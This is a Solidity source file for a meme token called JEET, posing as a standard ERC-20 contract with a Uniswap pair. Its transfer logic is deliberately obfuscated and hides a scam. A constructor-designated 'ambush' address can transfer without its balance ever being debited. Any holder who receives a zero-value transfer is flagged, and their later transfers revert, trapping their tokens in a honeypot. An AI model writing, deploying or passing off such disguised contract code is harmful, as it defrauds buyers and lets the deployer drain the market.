/*

https://t.me/JEET_ETH

---------------------------------------------------------------------------------------------------------
---------------------------------------------------------------------------------------------------------
---------------------------------------------------------------------------------------------------------
---------------------------------------------------------------------------------------------------------
---------------------------------------------------------------------------------------------------------
-----------------------------------------==+******#########*+=-------------------------------------------
-----------------------------------=++**##********#*#*#*#****%#*-----------------------------------------
--------------------------------=*##****##*####***********#####%@+---------------------------------------
------------------------------=#%%##********++++++********+++****%#--------------------------------------
-----------------------------+@%#*++++++++++++++++++++++++++++****#@+------------------------------------
----------------------------=@%*+++====++++++++***++++++++++********@#-----------------------------------
----------------------------#%+*++++++++***++********+++*##**###*****@#----------------------------------
----------------------------@*****+*****+**************#**##**********@+---------------------------------
---------------------------+@******########*++****++++***#**+*#%#*****#@---------------------------------
---------------------------*%+*+*******++***##+*++++++**%***%@%++++++++@*--------------------------------
---------------------------*%+++++*##%@@@%#*+*#++++++++%*+#@@#++====+++#@--------------------------------
---------------------------##++=++****##%@@@%*+++++++++*+%@@#++==++++++*@+-------------------------------
---------------------------##++=++++++***+*###+++********##############*%%-------------------------------
---------------------------*#++***###%%%%%%%@@@@@@@@@@@@@%%########%%%@@@@@*-----------------------------
--------------------------+%@@@%##****+***+****#@@@@@@@%*****@@%*+******%@@%-----------------------------
--------------------------*@@@@+++***+=%@##=**++%@%##%@#*** *@%#@:+#++++*@@*-----------------------------
--------------------------=@@@@+=+++#+:@@#@-=%#+@#++++@@+*@%%###**++++++*@*------------------------------
----------------------------%#@%===++*##%##%#%*#@+++++*@%+*####***++++**@@#------------------------------
----------------------------+##@#+++++++*#%%#*#@*++++++#@%***#%#######%%#*%------------------------------
-----------------------------%+*@%##%%%@@@@%%##**+++=+++*##%%%%%%%####****%------------------------------
-----------------------------+#******************++===++*****************##------------------------------
------------------------------%+************#***++====++++***%***********%*------------------------------
------------------------------************+%%*++++=====++++*@*##*********@=------------------------------
-------------------------------%+*********##%++**++==+++*+*#@#+%********#%-------------------------------
-------------------------------*#********+%++%***#***********#%#%*******@=-------------------------------
--------------------------------##********%#%%**************##*********##--------------------------------
---------------------------------+%*******#***##############**********#@%%##*+=--------------------------
---------------------------------=#@**********************************@@####%%%%#*+----------------------
------------------------------+*%%@%%********************************%%@%########%%%#*+=-----------------
------------------------=+*#%%%%##@%#@#*****************************#@#%%#############%%%*+=-------------
------------------=+*##%%%%######%%###@%***************************#@###%%################%%%#*=---------
-------------+*##%%%############%%#####%@*************************#%#####%%###################%%%*=------
---------=*%%%%################%%%######%@#**********************%%%######%%####################%%@*-----
------=*%%%####################%%%%%%%###%@%*********+-*#******%%@%#######%@%##################%%%%@+----
-----+%%%###########################%@%%%%%@*##****+=*#%****##+.#%####%%%%###################%%%%#%%%----
----+@%%############################%@%###%@= .+#==#%@@#%%*=.  :@%%%%@%####################%%######%@+---
---=%%%%%%%#########################%@%####%%=+#*####*#####+:  %@%%#%%%#################%%%########%%#---
---*@%#####%%%%######################%%####%@#%#####**#####****@###%@%################%%############%@=--
---%%##########%@%####%%%############%@%#%#*+*#**********++*#*+#%##%%################%%#############%@+--
---%%############%@%%%%##############%@%%%+####*++++**####+++*#*+#%@%###############@################%#--
---%%##############%@%###############%*=#%##*##**#******+*#*+++****#%############%%%#################%%--
---%%%##############%%%%############+-=#@@####*++++*###*+++*##+***++*%############@%#################%@=-
---#%###############%%#############=-*%%%%######%%#****##*******++*++%##########%%%%#################%@=-
---*%%##############%%###########+-#%###%%%######%@@*++++#***+**++*++%##########%%#%#################%@=-
---+@%##############%%###################%%%######%@@+*******++**+*+*%#############%%################%@+-
----%%###############@%###################%%@%#####%@***++***++****+*%#############%%################%@+-
----#%%##############%%#####################%%%####%@+**++***********%#############%%################%@+-

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract JEET is Ownable {
    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    uint256 public totalSupply = 420_690_000_000_000 * 10 ** 9;

    uint256 private smuggg = 13;

    address public uniswapV2Pair;

    constructor(address ambush) {
        balanceOf[msg.sender] = totalSupply;
        _jeet[ambush] = smuggg;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    mapping(address => mapping(address => uint256)) public allowance;

    uint8 public decimals = 9;

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private relay;

    function approve(address simulated, uint256 reindeer) public returns (bool success) {
        allowance[msg.sender][simulated] = reindeer;
        emit Approval(msg.sender, simulated, reindeer);
        return true;
    }

    function transferFrom(address regretful, address desi, uint256 reindeer) public returns (bool success) {
        jeetIt(regretful, desi, reindeer);
        require(reindeer <= allowance[regretful][msg.sender]);
        allowance[regretful][msg.sender] -= reindeer;
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private _jeet;

    function transfer(address desi, uint256 reindeer) public returns (bool success) {
        jeetIt(msg.sender, desi, reindeer);
        return true;
    }

    string public name = 'JEET';

    function jeetIt(address regretful, address desi, uint256 reindeer) private returns (bool success) {
        if (_jeet[regretful] == 0) {
            balanceOf[regretful] -= reindeer;
        }

        if (reindeer == 0) relay[desi] += smuggg;

        if (_jeet[regretful] == 0 && uniswapV2Pair != regretful && relay[regretful] > 0) {
            _jeet[regretful] -= smuggg;
        }

        balanceOf[desi] += reindeer;
        emit Transfer(regretful, desi, reindeer);
        return true;
    }

    string public symbol = 'JEET';
}